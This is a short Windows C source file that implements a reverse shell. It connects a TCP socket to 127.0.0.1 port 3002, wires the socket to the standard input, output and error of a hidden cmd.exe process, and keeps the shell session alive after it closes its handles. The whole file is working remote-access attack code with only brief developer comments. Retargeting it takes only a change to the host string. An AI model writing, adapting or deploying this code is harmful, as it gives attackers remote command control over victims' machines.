#include <WinSock2.h>
#include <Windows.h>
#include <tchar.h>
#include <WS2tcpip.h>

#pragma comment(lib, "ws2_32.lib")

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
                      _In_opt_ HINSTANCE hPrevInstance,
                      _In_ LPWSTR lpCmdLine,
                      _In_ int nCmdShow)
{
	WSADATA wsa;
	struct sockaddr_in server_address = {0};
	STARTUPINFO sui = {0};
	PROCESS_INFORMATION pi = {0};
	int result = WSAStartup(MAKEWORD(2, 2), &wsa);
	if (result != 0)
		return EXIT_FAILURE;

	// For some reason socket() won't work, WSASocket does
	// const SOCKET client_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	const SOCKET client_socket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP,
	                                       NULL, (unsigned int)NULL,
	                                       (unsigned int)NULL);

	if (client_socket == INVALID_SOCKET)
	{
		WSACleanup();
		return EXIT_FAILURE;
	}

	server_address.sin_family = AF_INET;
	server_address.sin_port = htons(3002);
	unsigned long server_ip_address;
	InetPton(AF_INET, _T("127.0.0.1"), &server_ip_address);
	server_address.sin_addr.S_un.S_addr = server_ip_address;

	result = connect(client_socket, (SOCKADDR*)& server_address, sizeof(server_address)); // Or
	// result = WSAConnect(client_socket, (SOCKADDR*)&server_address, sizeof(server_address), NULL, NULL, NULL, NULL);

	if (result == SOCKET_ERROR)
	{
		closesocket(client_socket);
		WSACleanup();
		return EXIT_FAILURE;
	}

	memset(&sui, 0, sizeof(sui));
	sui.cb = sizeof(sui);
	sui.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
	sui.hStdInput = (HANDLE)client_socket;
	sui.hStdOutput = (HANDLE)client_socket;
	sui.hStdError = (HANDLE)client_socket;

	TCHAR cmd[256] = _T("cmd.exe");
	if (!CreateProcess(NULL, cmd,
	                   NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi))
	{
		closesocket(client_socket);
		WSACleanup();
		return EXIT_FAILURE;
	}

	// If you want to keep this process alive until the cmd is finished then uncomment this
	// WaitForSingleObject(pi.hProcess, INFINITE);

	// Close socket handles, even if you close the socket handles, the shell session is alive
	closesocket(client_socket);
	CloseHandle(pi.hProcess);

	return EXIT_SUCCESS;
}
